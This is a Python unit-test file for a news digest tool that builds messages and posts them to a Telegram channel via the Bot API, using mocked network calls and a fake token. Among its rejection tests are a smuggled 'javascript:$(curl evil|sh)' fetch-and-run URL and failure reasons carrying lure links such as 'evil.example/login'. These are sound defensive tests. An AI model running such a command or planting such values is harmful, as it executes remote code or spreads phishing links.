"""Швы «сборка сообщений», «отправка Bot API», «sboj и nesohraneno», «opublikovat --suhoj».

Токен — из подменённого окружения или временного файла секретов; сеть — подменённый urlopen.
"""
import contextlib
import http.client
import io
import json
import os
import subprocess
import sys
import tempfile
import traceback
import unittest
import urllib.error
from datetime import datetime, timedelta, timezone
from pathlib import Path
from unittest import mock

from newsai import __main__ as tochka, nastrojki, publikaciya, sostoyanie

OBRAZCY = Path(__file__).resolve().parent / "publikaciya"
VYPUSK = OBRAZCY / "vypusk.json"
PROGON = OBRAZCY / "progon.json"
PEREMENNAYA = "TELEGRAM_BOT_TOKEN"
LOZHNYY = "123456:poddelka-dlya-testa"
KANAL = -1004434993234
SEYCHAS = datetime(2026, 11, 11, 2, 20, tzinfo=timezone.utc)

URL_OPUS = 'https://www.anthropic.com/news/claude-opus-5-5?utm=a&b="c"'
URL_CODEX = "https://openai.com/index/codex-for-everyone/"

OZHIDAEMYE_ZAPROSY = [
    {"chat_id": KANAL, "parse_mode": "HTML", "link_preview_options": {"url": URL_OPUS}, "text":
        '<b><a href="https://www.anthropic.com/news/claude-opus-5-5?utm=a&amp;b=&quot;c&quot;">'
        "Anthropic выпустила Claude Opus 5.5 — «модель &lt;для агентов&gt;» &amp; не только</a></b>\n\n"
        "Anthropic представила Claude Opus 5.5.\n\n"
        "Модель держит длинные задачи агентов дольше прежней.\n\n"
        "Цена за токен не изменилась.\n\n"
        "Модель уже доступна в API и в Claude Code.\n\n"
        "Старшая версия прошлого поколения уходит из эксплуатации через 60 дней."},
    {"chat_id": KANAL, "parse_mode": "HTML", "link_preview_options": {"url": URL_CODEX}, "text":
        "⭐ набирает обороты\n"
        '<b><a href="https://openai.com/index/codex-for-everyone/">OpenAI открыла Codex для всех тарифов</a></b>\n\n'
        "OpenAI сделала Codex доступным на всех платных тарифах.\n\n"
        "Лимиты зависят от тарифа.\n\n"
        "В бесплатном тарифе Codex по-прежнему нет.\n\n"
        "Включается в настройках ChatGPT.\n\n"
        "Работает и в облаке, и локально."},
    {"chat_id": KANAL, "parse_mode": "HTML", "link_preview_options": {"is_disabled": True}, "text":
        '1. ⭐ <a href="https://deepmind.google/blog/deep-think-api/">Gemini получил режим &lt;Deep Think&gt; '
        "в API</a> (DeepMind)\n"
        '2. <a href="https://www.bensbites.com/p/week-45?a=1&amp;b=2">Ben &amp; Bites: обзор недели</a> '
        "(Ben's Bites)"},
    {"chat_id": KANAL, "parse_mode": "HTML", "link_preview_options": {"is_disabled": True}, "text":
        '1. ⭐ @sama: <a href="https://x.com/sama/status/1988000000000000002">Сэм Альтман: GPT-6 Luna выйдет '
        "в декабре</a>\n"
        '2. @simonw: <a href="https://x.com/simonw/status/1988000000000000003">Саймон Уиллисон: заметки о '
        "&lt;tool use&gt; &amp; агентах</a>"},
    {"chat_id": KANAL, "parse_mode": "HTML", "link_preview_options": {"is_disabled": True}, "text":
        '1. <a href="https://www.techmeme.com/261110/p12">Mistral привлекла раунд на 2 млрд евро</a> (Techmeme)'},
    {"chat_id": KANAL, "parse_mode": "HTML", "link_preview_options": {"is_disabled": True}, "text":
        '1. <a href="https://github.com/anthropics/claude-code/issues/4321">Моды в Claude Code: команда для '
        "своей панели</a> (GitHub Claude Code) · скоро"},
    {"chat_id": KANAL, "parse_mode": "HTML", "text": "не ответили: X, OpenAI API"},
]


def obrazec_vypuska() -> dict:
    return json.loads(VYPUSK.read_text(encoding="utf-8"))


def krupnaya(**pole) -> dict:
    p = {"zagolovok": "Заголовок", "abzacy": ["Раз.", "Два.", "Три.", "Четыре.", "Пять."],
         "url": "https://a/1", "oboroty": False, "idy": ["https://a/1"]}
    p.update(pole)
    return p


def sayt(n=1, **pole) -> dict:
    p = {"zagolovok": f"Строка {n}", "url": f"https://b/{n}", "istochnik": "Cursor", "zvezda": False,
         "idy": [f"https://b/{n}"]}
    p.update(pole)
    return p


def iks(n=1, **pole) -> dict:
    p = {"zagolovok": f"Пост {n}", "url": f"https://x.com/sama/status/{n}", "akkaunt": "sama", "zvezda": False,
         "idy": [f"https://x.com/sama/status/{n}"]}
    p.update(pole)
    return p


def github(n=1, **pole) -> dict:
    p = {"zagolovok": f"Issue {n}", "url": f"https://github.com/anthropics/claude-code/issues/{n}",
         "idy": [f"https://github.com/anthropics/claude-code/issues/{n}"]}
    p.update(pole)
    return p


class Sborka(unittest.TestCase):
    def setUp(self):
        self.s = publikaciya.soobshcheniya(obrazec_vypuska(), ["X", "OpenAI API", "X"])

    def test_poryadok_r49(self):
        self.assertEqual([s["vid"] for s in self.s],
                         ["krupnye", "krupnye", "sayty", "x", "dengi", "github", "ne_otvetili"])

    def test_zaprosy_literalami(self):
        self.assertEqual([publikaciya.zapros(s) for s in self.s], OZHIDAEMYE_ZAPROSY)

    def test_krupnaya_ssylka_v_zagolovke_bez_istochnika_i_citaty(self):
        tekst = self.s[0]["tekst"]
        self.assertTrue(tekst.startswith('<b><a href="https://www.anthropic.com/'))
        self.assertNotIn("Источник", tekst)
        self.assertNotIn("blockquote", tekst)

    def test_oboroty_pometka_pered_zagolovkom(self):
        self.assertTrue(self.s[1]["tekst"].startswith(
            '⭐ набирает обороты\n<b><a href="https://openai.com/index/codex-for-everyone/">'))
        self.assertNotIn("набирает обороты", self.s[0]["tekst"])
        s = publikaciya.soobshcheniya({"krupnye": [krupnaya(zagolovok="Z", url="https://a.b/", oboroty=True)]}, [])
        self.assertEqual(s[0]["tekst"], '⭐ набирает обороты\n<b><a href="https://a.b/">Z</a></b>\n\n'
                                        "Раз.\n\nДва.\n\nТри.\n\nЧетыре.\n\nПять.")
        self.assertEqual(self.s[1]["punkty"], [{"zagolovok": "OpenAI открыла Codex для всех тарифов",
                                                "url": URL_CODEX, "idy": [URL_CODEX],
                                                "vid": "krupnaya", "oboroty": True}])

    def test_zvezda_v_dengah_i_x_tolko_po_priznaku(self):
        s = publikaciya.soobshcheniya({"dengi": [sayt(1, istochnik="Techmeme", zvezda=True), sayt(2)]}, [])
        self.assertEqual(s[0]["tekst"], '1. ⭐ <a href="https://b/1">Строка 1</a> (Techmeme)\n'
                                        '2. <a href="https://b/2">Строка 2</a> (Cursor)')
        s = publikaciya.soobshcheniya({"x": [iks(1)]}, [])
        self.assertEqual(s[0]["tekst"], '1. @sama: <a href="https://x.com/sama/status/1">Пост 1</a>')

    def test_ne_otvetili_ekraniruetsya(self):
        s = publikaciya.soobshcheniya({"sayty": [sayt()]}, ["A<b>&"])
        self.assertEqual(s[-1]["tekst"], "не ответили: A&lt;b&gt;&amp;")

    def test_pustoy_vypusk_nichego_i_bez_ne_otvetili(self):
        pusto = {"krupnye": [], "sayty": [], "x": [], "dengi": [], "github": []}
        self.assertEqual(publikaciya.soobshcheniya(pusto, ["X"]), [])
        self.assertEqual(publikaciya.soobshcheniya({}, ["X"]), [])

    def test_pustoy_spisok_ne_otpravlyaetsya(self):
        s = publikaciya.soobshcheniya({"krupnye": [], "sayty": [], "x": [iks()], "dengi": [], "github": []}, [])
        self.assertEqual([m["vid"] for m in s], ["x"])
        s = publikaciya.soobshcheniya({"github": [github()]}, ["X"])
        self.assertEqual([m["vid"] for m in s], ["github", "ne_otvetili"])

    def test_limit_4096_rovno_mozhno_bolshe_nelzya(self):
        osnova = len('<b><a href="https://a/1">З</a></b>') + 4 * len("\n\nа") + len("\n\n")
        zapas = 4096 - osnova
        rovno = publikaciya.soobshcheniya(
            {"krupnye": [krupnaya(zagolovok="З", abzacy=["а"] * 4 + ["я" * zapas])]}, [])
        self.assertEqual(publikaciya.dlina(rovno[0]["tekst"]), 4096)
        with self.assertRaises(publikaciya.OtkazVypuska) as e:
            publikaciya.soobshcheniya({"krupnye": [krupnaya(zagolovok="З", abzacy=["а"] * 4 + ["я" * (zapas + 1)])]}, [])
        self.assertIn("4096", str(e.exception))

    def test_limit_schitaet_razmetku_i_utf16(self):
        self.assertEqual(publikaciya.dlina("⭐"), 1)
        self.assertEqual(publikaciya.dlina("😀"), 2)
        dlinnye = [sayt(n, zagolovok="&" * 300) for n in range(1, 4)]
        with self.assertRaises(publikaciya.OtkazVypuska):
            publikaciya.soobshcheniya({"sayty": dlinnye}, [])

    def test_predely_3_10_10_5(self):
        for vypusk, mozhno in (({"krupnye": [krupnaya(url=f"https://a/{n}") for n in range(3)]}, True),
                               ({"krupnye": [krupnaya(url=f"https://a/{n}") for n in range(4)]}, False),
                               ({"sayty": [sayt(n) for n in range(1, 11)]}, True),
                               ({"sayty": [sayt(n) for n in range(1, 12)]}, False),
                               ({"x": [iks(n) for n in range(1, 11)]}, True),
                               ({"x": [iks(n) for n in range(1, 12)]}, False),
                               ({"dengi": [sayt(n) for n in range(1, 6)]}, True),
                               ({"dengi": [sayt(n) for n in range(1, 7)]}, False)):
            with self.subTest(razdel=list(vypusk), punktov=len(next(iter(vypusk.values())))):
                if mozhno:
                    publikaciya.soobshcheniya(vypusk, [])
                else:
                    with self.assertRaises(publikaciya.OtkazVypuska):
                        publikaciya.soobshcheniya(vypusk, [])

    def test_abzacev_5_8(self):
        for n, mozhno in ((4, False), (5, True), (8, True), (9, False)):
            v = {"krupnye": [krupnaya(abzacy=[f"Абзац {i}." for i in range(n)])]}
            with self.subTest(abzacev=n):
                if mozhno:
                    publikaciya.soobshcheniya(v, [])
                else:
                    with self.assertRaises(publikaciya.OtkazVypuska):
                        publikaciya.soobshcheniya(v, [])

    def test_otkaz_po_scheme(self):
        for plohoy in ({"spisok": [sayt()]},
                       {"krupnye": [krupnaya(citata="Цитата.")]},
                       {"krupnye": [krupnaya(zagolovok="")]},
                       {"krupnye": [krupnaya(oboroty="да")]},
                       {"sayty": [sayt(zvezda=None)]},
                       {"sayty": [{k: v for k, v in sayt().items() if k != "zvezda"}]},
                       {"sayty": [sayt(istochnik=None)]},
                       {"sayty": [sayt(idy=[])]},
                       {"sayty": [sayt(zagolovok="я" * 301)]},
                       {"sayty": [sayt(zagolovok="раз\nдва")]},
                       {"x": [iks(akkaunt="@sama")]},
                       {"github": [github(istochnik="GitHub")]},
                       {"sayty": ["строка"]},
                       {"sayty": {}},
                       []):
            with self.subTest(plohoy=plohoy), self.assertRaises(publikaciya.OtkazVypuska):
                publikaciya.soobshcheniya(plohoy, [])
        publikaciya.soobshcheniya({"sayty": [sayt(zagolovok="я" * 300)]}, [])
        with self.assertRaises(publikaciya.OtkazVypuska):
            publikaciya.soobshcheniya({"sayty": [sayt()]}, "X")

    def test_plohoy_adres_ne_popadaet_v_otkaz(self):
        with self.assertRaises(publikaciya.OtkazVypuska) as e:
            publikaciya.soobshcheniya({"sayty": [sayt(url="javascript:$(curl evil|sh)")]}, [])
        self.assertEqual(str(e.exception), "список сайтов, пункт 1: адрес не http(s)")


class Slot(unittest.TestCase):
    def test_nachalo_slota_v_utc(self):
        for kogda, ozhidaem in (((2026, 11, 11, 2, 20), "2026-11-11T02:00:00Z"),
                                ((2026, 11, 11, 10, 7), "2026-11-11T10:00:00Z"),
                                ((2026, 11, 11, 17, 30), "2026-11-11T10:00:00Z"),
                                ((2026, 11, 11, 18, 40), "2026-11-11T18:00:00Z"),
                                ((2026, 11, 11, 1, 59), "2026-11-10T18:00:00Z")):
            with self.subTest(kogda=kogda):
                self.assertEqual(publikaciya.slot(datetime(*kogda, tzinfo=timezone.utc)), ozhidaem)

    def test_slot_publikatora_raven_slotu_otkrytiya(self):
        for nachalo, ozhidaem in (((2026, 11, 11, 2, 0), "2026-11-11T02:00:00Z"),
                                  ((2026, 11, 11, 10, 0), "2026-11-11T10:00:00Z"),
                                  ((2026, 11, 10, 18, 0), "2026-11-10T18:00:00Z")):
            with self.subTest(nachalo=nachalo):
                start = datetime(*nachalo, tzinfo=timezone.utc)
                pozdnee = start + timedelta(minutes=39, seconds=59) + timedelta(hours=3, minutes=20)
                self.assertEqual(publikaciya.slot(start), ozhidaem)
                self.assertEqual(publikaciya.slot(pozdnee), ozhidaem)

    def test_okno_slota(self):
        nachalo = datetime(2026, 11, 11, 2, 0, tzinfo=timezone.utc)
        for kogda, v_okne in (((2026, 11, 11, 2, 0, 0), True), ((2026, 11, 11, 2, 39, 59), True),
                              ((2026, 11, 11, 2, 40, 0), False), ((2026, 11, 11, 9, 59, 59), False),
                              ((2026, 11, 11, 1, 59, 59), False)):
            with self.subTest(kogda=kogda):
                self.assertIs(publikaciya.v_okne_slota(datetime(*kogda, tzinfo=timezone.utc)), v_okne)
                self.assertIs(publikaciya.v_okne_slota(datetime(*kogda, tzinfo=timezone.utc), nachalo), v_okne)


class Telegram:
    """Подменённый urlopen: пишет запросы, отвечает по очереди из списка (ответ или исключение)."""

    def __init__(self, *otvety, pri_zaprose=None):
        self.otvety = list(otvety)
        self.zaprosy = []
        self.pri_zaprose = pri_zaprose

    @staticmethod
    def ok(result=None):
        return {"ok": True, "result": result or {"message_id": 1}}

    def __call__(self, zapr, timeout=None):
        self.zaprosy.append(zapr)
        if self.pri_zaprose:
            self.pri_zaprose()
        otvet = self.otvety.pop(0) if self.otvety else self.ok()
        if isinstance(otvet, BaseException):
            raise otvet
        o = mock.MagicMock()
        o.read.return_value = json.dumps(otvet).encode("utf-8")
        o.__enter__.return_value = o
        return o

    def tela(self):
        return [json.loads(z.data) for z in self.zaprosy]


def http_oshibka(kod: int, dannye: dict):
    return urllib.error.HTTPError("https://api.telegram.org/bot***/sendMessage", kod, "err", {},
                                  io.BytesIO(json.dumps(dannye).encode("utf-8")))


class SFaylami(unittest.TestCase):
    """Файлы прогона и выпуска — образцы или копии во временной папке проекта.

    Токен — из подменённого окружения; файл секретов — во временной папке (по умолчанию его нет).
    """

    def setUp(self):
        papka = nastrojki.KOREN / "temp"
        papka.mkdir(exist_ok=True)
        self._papka = tempfile.TemporaryDirectory(dir=papka)
        self.papka = Path(self._papka.name)
        self.sost = self.papka / "sostoyanie.json"
        self.sekrety = self.papka / "sekrety"
        okr = {"NEWSAI_SOSTOYANIE": str(self.sost), "NEWSAI_PROGON": str(PROGON),
               "NEWSAI_VYPUSK": str(VYPUSK), "NEWSAI_SBOJ": str(self.papka / "sboj.json"),
               PEREMENNAYA: LOZHNYY}
        for zaplatka in (mock.patch.dict(os.environ, okr),
                         mock.patch.object(nastrojki, "FAYL_SEKRETOV", self.sekrety),
                         mock.patch.object(publikaciya, "seychas", return_value=SEYCHAS)):
            zaplatka.start()
            self.addCleanup(zaplatka.stop)
        self.addCleanup(self._papka.cleanup)

    def svoy_vypusk(self, dannye: dict) -> None:
        put = self.papka / "vypusk.json"
        put.write_text(json.dumps(dannye, ensure_ascii=False), encoding="utf-8")
        os.environ["NEWSAI_VYPUSK"] = str(put)

    def fayl_sboya(self, dannye) -> None:
        (self.papka / "sboj.json").write_text(json.dumps(dannye, ensure_ascii=False), encoding="utf-8")

    def zapusk(self, telegram: Telegram | None = None, **kw):
        out, err = io.StringIO(), io.StringIO()
        telegram = telegram or Telegram()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err), \
                mock.patch("urllib.request.urlopen", side_effect=telegram), mock.patch("time.sleep"):
            kod = publikaciya.opublikovat(**kw)
        return kod, out.getvalue(), err.getvalue(), telegram


class Otpravka(SFaylami):
    def test_kazhdyy_punkt_v_sostoyanii_do_sleduyushchego_soobshcheniya(self):
        na_diske = []
        telegram = Telegram(pri_zaprose=lambda: na_diske.append(sostoyanie.zagruzit(self.sost)))
        kod, out, err, _ = self.zapusk(telegram)
        self.assertEqual(kod, 0, err)
        self.assertEqual([z.full_url for z in telegram.zaprosy],
                         ["https://api.telegram.org/bot123456:poddelka-dlya-testa/sendMessage"] * 7)
        self.assertEqual(telegram.tela(), OZHIDAEMYE_ZAPROSY)
        self.assertEqual(na_diske[0]["opublikovannye"], [])
        self.assertEqual(na_diske[1]["opublikovannye"], [
            {"zagolovok": "Anthropic выпустила Claude Opus 5.5 — «модель <для агентов>» & не только",
             "url": URL_OPUS, "data": "2026-11-11T02:20:00Z", "vid": "krupnaya", "oboroty": False}])
        self.assertIn("https://x.com/AnthropicAI/status/1988000000000000001", na_diske[1]["vidennye"])
        self.assertEqual(len(na_diske[6]["opublikovannye"]), 8)
        self.assertIsNone(na_diske[6]["posledniy_sbor"])

        itog = sostoyanie.zagruzit(self.sost)
        self.assertEqual([(p["url"], p["vid"], p["oboroty"]) for p in itog["opublikovannye"]], [
            (URL_OPUS, "krupnaya", False),
            (URL_CODEX, "krupnaya", True),
            ("https://deepmind.google/blog/deep-think-api/", "sayty", False),
            ("https://www.bensbites.com/p/week-45?a=1&b=2", "sayty", False),
            ("https://x.com/sama/status/1988000000000000002", "x", False),
            ("https://x.com/simonw/status/1988000000000000003", "x", False),
            ("https://www.techmeme.com/261110/p12", "dengi", False),
            ("https://github.com/anthropics/claude-code/issues/4321", "github", False),
        ])
        self.assertEqual(itog["posledniy_sbor"], "2026-11-11T01:07:00Z")
        self.assertEqual(itog["posledniy_slot"], "2026-11-11T02:00:00Z")
        self.assertIs(itog["github_obhod"], True)
        for i in ("https://simonwillison.net/2026/Nov/10/fixed-typo/",
                  "https://github.com/anthropics/claude-code/issues/1000"):
            self.assertIn(i, itog["vidennye"])
        self.assertNotIn("https://simonwillison.net/2026/Nov/10/opus-5-5/", itog["vidennye"])
        self.assertEqual(out.strip(), "отправлено сообщений: 7")

    def test_token_iz_fayla_sekretov(self):
        del os.environ[PEREMENNAYA]
        self.sekrety.write_text("# бот\nTELEGRAM_BOT_TOKEN=987:iz_fayla-sekretov\n", encoding="utf-8")
        kod, _, err, telegram = self.zapusk()
        self.assertEqual(kod, 0, err)
        self.assertEqual(telegram.zaprosy[0].full_url, "https://api.telegram.org/bot987:iz_fayla-sekretov/sendMessage")

    def test_net_tokena_otkaz(self):
        del os.environ[PEREMENNAYA]
        kod, _, err, telegram = self.zapusk()
        self.assertEqual(kod, 1)
        self.assertIn("нет TELEGRAM_BOT_TOKEN", err)
        self.assertEqual(telegram.zaprosy, [])
        self.assertFalse(self.sost.exists())

    def test_token_ne_togo_vida_otkaz_bez_znacheniya(self):
        os.environ[PEREMENNAYA] = "123456:AAA BBB-proba"
        kod, _, err, telegram = self.zapusk()
        self.assertEqual(kod, 1)
        self.assertIn("TELEGRAM_BOT_TOKEN в переменной окружения не того вида", err)
        self.assertNotIn("AAA BBB", err)
        self.assertEqual(telegram.zaprosy, [])

    def test_obryv_posredi_vypuska_stroka_sboya(self):
        telegram = Telegram(Telegram.ok(), http_oshibka(400, {"ok": False, "error_code": 400,
                                                              "description": "Bad Request: chat not found"}))
        kod, _, err, _ = self.zapusk(telegram)
        self.assertEqual(kod, 1)
        self.assertIn("отправлено 1 из 7", err)
        self.assertEqual(len(telegram.zaprosy), 3)
        self.assertEqual(telegram.tela()[2], {
            "chat_id": KANAL,
            "text": "выпуск 09:00 не собран: часть выпуска не отправлена: sendMessage: 400 Bad Request: chat not found"})
        self.assertEqual([t["text"] for t in telegram.tela() if t["text"].startswith("выпуск 09:00 не собран")],
                         ["выпуск 09:00 не собран: часть выпуска не отправлена: sendMessage: 400 Bad Request: "
                          "chat not found"])
        sost = sostoyanie.zagruzit(self.sost)
        self.assertEqual([p["url"] for p in sost["opublikovannye"]], [URL_OPUS])
        self.assertIsNone(sost["posledniy_sbor"])
        self.assertEqual(sost["posledniy_slot"], "2026-11-11T02:00:00Z")
        self.assertIs(sost["github_obhod"], False)

    def test_obryv_na_pervom_soobshchenii(self):
        telegram = Telegram(http_oshibka(403, {"ok": False, "error_code": 403,
                                               "description": "Forbidden: bot is not a member"}))
        kod, _, _, _ = self.zapusk(telegram)
        self.assertEqual(kod, 1)
        self.assertEqual(telegram.tela()[1:], [{
            "chat_id": KANAL,
            "text": "выпуск 09:00 не собран: выпуск не отправлен: sendMessage: 403 Forbidden: bot is not a member"}])
        self.assertEqual(sostoyanie.zagruzit(self.sost)["opublikovannye"], [])

    def test_isklyuchenie_s_tokenom_ne_utekaet(self):
        oshibka = http.client.InvalidURL(f"URL can't contain control characters. '/bot{LOZHNYY}/sendMessage'")
        kod, out, err, telegram = self.zapusk(Telegram(oshibka, RuntimeError(f"сбой {LOZHNYY}")))
        self.assertEqual(kod, 1)
        self.assertEqual(len(telegram.zaprosy), 2)
        self.assertNotIn(LOZHNYY, out + err)
        self.assertIn("InvalidURL", err)
        self.assertIn("строка сбоя не отправлена: sendMessage: RuntimeError: сбой ***", err)

    def test_otkaz_do_pervoy_otpravki(self):
        v = obrazec_vypuska()
        v["sayty"] += [sayt(n, zagolovok="&" * 300) for n in range(3, 6)]
        self.svoy_vypusk(v)
        kod, _, err, telegram = self.zapusk()
        self.assertEqual(kod, 1)
        self.assertEqual(telegram.zaprosy, [])
        self.assertIn("4096", err)
        self.assertFalse(self.sost.exists())

    def test_pustoy_vypusk_bez_tokena_sdvigaet_period(self):
        del os.environ[PEREMENNAYA]
        self.svoy_vypusk({"krupnye": [], "sayty": [], "x": [], "dengi": [], "github": []})
        kod, out, _, telegram = self.zapusk()
        self.assertEqual(kod, 0)
        self.assertEqual(telegram.zaprosy, [])
        self.assertEqual(out.strip(), "выпуск пустой — ничего не отправлено")
        sost = sostoyanie.zagruzit(self.sost)
        self.assertEqual(sost["posledniy_sbor"], "2026-11-11T01:07:00Z")
        self.assertEqual(sost["posledniy_slot"], "2026-11-11T02:00:00Z")
        self.assertEqual(sost["opublikovannye"], [])
        self.assertIn(URL_CODEX, sost["vidennye"])


class SboromPublikatora(SFaylami):
    """У публикатора NEWSAI_PROGON — его сбор (tests/proverka/sbor-publikatora.json), а не файл прогона
    заявки: «не ответили», конец периода и увиденное — оттуда."""

    def setUp(self):
        super().setUp()
        obrazcy = Path(__file__).resolve().parent / "proverka"
        os.environ["NEWSAI_PROGON"] = str(obrazcy / "sbor-publikatora.json")
        os.environ["NEWSAI_VYPUSK"] = str(obrazcy / "vypusk.json")

    def test_ne_otvetili_i_uvidennoe_iz_sbora_publikatora(self):
        kod, out, err, telegram = self.zapusk()
        self.assertEqual(kod, 0, err)
        self.assertEqual(telegram.tela()[-1], {"chat_id": KANAL, "parse_mode": "HTML", "text": "не ответили: OpenAI API"})
        self.assertEqual(len(telegram.tela()), 7)
        sost = sostoyanie.zagruzit(self.sost)
        self.assertEqual(sost["posledniy_sbor"], "2026-11-11T01:15:00Z")
        self.assertEqual(sorted(sost["vidennye"]), [
            "https://deepmind.google/blog/deep-think-api/",
            "https://github.com/anthropics/claude-code/issues/4321",
            "https://openai.com/index/codex-for-everyone/",
            "https://www.anthropic.com/news/claude-opus-5-5",
            "https://www.techmeme.com/261110/p12",
            "https://x.com/AnthropicAI/status/1988000000000000001",
            "https://x.com/sama/status/1988000000000000002",
        ])
        self.assertIs(sost["github_obhod"], False)

    def test_slot_po_chasam_publikatora_pozdnee_vsego(self):
        with mock.patch.object(publikaciya, "seychas",
                               return_value=datetime(2026, 11, 11, 5, 59, 59, tzinfo=timezone.utc)):
            kod, _, err, _ = self.zapusk()
        self.assertEqual(kod, 0, err)
        self.assertEqual(sostoyanie.zagruzit(self.sost)["posledniy_slot"], "2026-11-11T02:00:00Z")

    def test_suhoj_ne_otvetili_iz_sbora(self):
        del os.environ[PEREMENNAYA]
        kod, out, _, _ = self.zapusk(suhoj=True)
        self.assertEqual(kod, 0)
        self.assertEqual(out.count("--- запрос "), 7)
        self.assertIn('"text": "не ответили: OpenAI API"', out)


class FaylSboya(SFaylami):
    def setUp(self):
        super().setUp()
        os.environ["NEWSAI_VYPUSK"] = str(self.papka / "vypuska-net.json")
        os.environ["NEWSAI_PROGON"] = str(self.papka / "progona-net.json")
        prezhnee = sostoyanie.pustoe()
        prezhnee["posledniy_sbor"] = "2026-11-10T18:07:00Z"
        sostoyanie.sohranit(prezhnee, self.sost)

    def test_stroka_sboya_slot_bez_sdviga_perioda(self):
        self.fayl_sboya({"prichina": "не ответил ни один источник"})
        kod, _, err, telegram = self.zapusk()
        self.assertEqual(kod, 0, err)
        self.assertEqual(telegram.tela(), [{"chat_id": KANAL,
                                            "text": "выпуск 09:00 не собран: не ответил ни один источник"}])
        sost = sostoyanie.zagruzit(self.sost)
        self.assertEqual(sost["posledniy_sbor"], "2026-11-10T18:07:00Z")
        self.assertEqual(sost["posledniy_slot"], "2026-11-11T02:00:00Z")
        self.assertEqual(sost["vidennye"], {})

    def test_suhoj_pechataet_i_ne_trogaet_sostoyanie(self):
        self.fayl_sboya({"prichina": "проверка выпуска не прошла"})
        del os.environ[PEREMENNAYA]
        kod, out, _, telegram = self.zapusk(suhoj=True)
        self.assertEqual(kod, 0)
        self.assertEqual(telegram.zaprosy, [])
        self.assertEqual(out, '--- запрос 1 из 1: sendMessage\n{\n  "chat_id": -1004434993234,\n'
                              '  "text": "выпуск 09:00 не собран: проверка выпуска не прошла"\n}\n')
        self.assertIsNone(sostoyanie.zagruzit(self.sost)["posledniy_slot"])

    def test_kazhdaya_fraza_nabora(self):
        for prichina in ("сбор упал", "не ответил ни один источник", "проверка выпуска не прошла"):
            with self.subTest(prichina=prichina):
                self.fayl_sboya({"prichina": f"  {prichina} "})
                kod, _, err, telegram = self.zapusk()
                self.assertEqual(kod, 0, err)
                self.assertEqual(telegram.tela(), [{"chat_id": KANAL, "text": f"выпуск 09:00 не собран: {prichina}"}])

    def test_prichina_ne_iz_nabora_otkaz_bez_teksta_agenta(self):
        for prichina in ("сбор упал: https://evil.example/login", "сбор упал: t.me/evil_channel",
                         "не ответил ни один источник — пишите @evil_bot", "сбор упал: evil.com",
                         "три отказа proverit", "Сбор упал"):
            with self.subTest(prichina=prichina):
                self.fayl_sboya({"prichina": prichina})
                kod, out, err, telegram = self.zapusk()
                self.assertEqual(kod, 1)
                self.assertEqual(telegram.zaprosy, [])
                self.assertEqual(err, "newsai opublikovat: отказ, ничего не отправлено: файл сбоя: причина не из "
                                      "набора причин публикатора\n")
                self.assertNotIn("evil", out + err)

    def test_i_vypusk_i_sboj_otkaz(self):
        self.fayl_sboya({"prichina": "сбой"})
        os.environ["NEWSAI_VYPUSK"] = str(VYPUSK)
        kod, _, err, telegram = self.zapusk()
        self.assertEqual(kod, 1)
        self.assertIn("и файл выпуска, и файл сбоя", err)
        self.assertEqual(telegram.zaprosy, [])

    def test_negodnyy_fayl_sboya_otkaz(self):
        for plohoy in ({"prichina": "я" * 201}, {"prichina": ""}, {"prichina": "раз\nдва"},
                       {"prichina": "сбой", "lishnee": 1}, ["сбой"]):
            with self.subTest(plohoy=plohoy):
                self.fayl_sboya(plohoy)
                kod, _, _, telegram = self.zapusk()
                self.assertEqual(kod, 1)
                self.assertEqual(telegram.zaprosy, [])
        self.fayl_sboya({"prichina": "сбор упал"})
        self.assertEqual(self.zapusk()[0], 0)


class SuhojVProcesse(SFaylami):
    def test_bez_tokena_bez_sostoyaniya_pechataet_zaprosy(self):
        del os.environ[PEREMENNAYA]
        kod, out, _, telegram = self.zapusk(suhoj=True)
        self.assertEqual(kod, 0)
        self.assertEqual(out.count("--- запрос "), 7)
        self.assertEqual(telegram.zaprosy, [])
        self.assertFalse(self.sost.exists())


class SuhojKomanda(SFaylami):
    """`python -m newsai opublikovat --suhoj` на образцах прогона и выпуска."""

    def zapros_komandy(self):
        okr = {k: v for k, v in os.environ.items() if k != PEREMENNAYA}
        return subprocess.run([sys.executable, "-m", "newsai", "opublikovat", "--suhoj"],
                              cwd=nastrojki.KOREN, env=okr, capture_output=True, text=True,
                              encoding="utf-8", timeout=60)

    def test_zaprosy_k_bot_api(self):
        r = self.zapros_komandy()
        self.assertEqual(r.returncode, 0, r.stderr)
        bloki = [b for b in r.stdout.split("--- запрос ") if b.strip()]
        self.assertEqual(len(bloki), 7)
        zaprosy = []
        for n, b in enumerate(bloki, 1):
            zagolovok, _, telo = b.partition("\n")
            self.assertEqual(zagolovok, f"{n} из 7: sendMessage")
            zaprosy.append(json.loads(telo))
        self.assertEqual(zaprosy, OZHIDAEMYE_ZAPROSY)
        self.assertNotIn("api.telegram.org/bot", r.stdout)
        self.assertFalse(self.sost.exists())

    def test_otkaz_bez_fayla_vypuska(self):
        os.environ["NEWSAI_VYPUSK"] = str(self.papka / "netu.json")
        r = self.zapros_komandy()
        self.assertEqual(r.returncode, 1)
        self.assertIn("файл выпуска", r.stderr)


class BotApi(unittest.TestCase):
    """Отправитель Bot API с подменённым urlopen: 429 и ошибки, токен не утекает."""

    def otpravit(self, *otvety, parametry=None):
        telegram = Telegram(*otvety)
        with mock.patch("urllib.request.urlopen", side_effect=telegram), mock.patch("time.sleep") as son:
            try:
                rez = publikaciya.bot_api(LOZHNYY)("sendMessage", parametry or {"chat_id": 1, "text": "т"})
            except publikaciya.OshibkaTelegram as e:
                rez = e
        return rez, telegram, son

    def test_429_zhdet_retry_after_i_povtoryaet(self):
        oshibka = http_oshibka(429, {"ok": False, "error_code": 429, "description": "Too Many Requests",
                                     "parameters": {"retry_after": 7}})
        rez, telegram, son = self.otpravit(oshibka, {"ok": True, "result": {"message_id": 5}})
        self.assertEqual(rez, {"message_id": 5})
        son.assert_called_once_with(7)
        self.assertEqual(len(telegram.zaprosy), 2)
        self.assertEqual(telegram.zaprosy[1].full_url, "https://api.telegram.org/bot123456:poddelka-dlya-testa/sendMessage")
        self.assertEqual(telegram.tela()[1], {"chat_id": 1, "text": "т"})

    def test_drugaya_oshibka_bez_povtora_i_bez_tokena(self):
        oshibka = http_oshibka(400, {"ok": False, "error_code": 400,
                                     "description": f"Bad Request: token {LOZHNYY}"})
        rez, telegram, son = self.otpravit(oshibka)
        self.assertEqual(len(telegram.zaprosy), 1)
        son.assert_not_called()
        self.assertEqual(str(rez), "sendMessage: 400 Bad Request: token ***")

    def test_set_upala_bez_povtora(self):
        rez, telegram, _ = self.otpravit(urllib.error.URLError("timed out"))
        self.assertIsInstance(rez, publikaciya.OshibkaTelegram)
